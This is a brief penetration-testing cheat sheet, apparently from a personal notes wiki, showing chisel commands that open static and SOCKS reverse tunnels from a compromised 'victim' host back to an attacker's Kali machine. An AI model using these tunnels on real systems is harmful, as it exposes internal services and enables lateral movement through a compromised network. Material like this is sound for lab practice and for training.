## Static tunnel
```bash
# First on Kali:
chisel server -p 9001 --reverse
# Then on host (victim):
chisel client <your-kali-ip>:9001 R:3306:127.0.0.1:3306 # 3306 for mysql, but could be any port you want
./chisel client 192.168.49.196:80 R:8443:127.0.0.1:8443 # 3306 for mysql, but could be any port you want
```
## Dynamic tunnel
```bash
# On Kali:
chisel server -p 9050 --socks5 --reverse 
# On host (victim):
chisel client <kali-ip>:9050 R:socks
```

## More Information
- [[Chisel]]
- [[Proxychains]]
- [[Sshuttle]]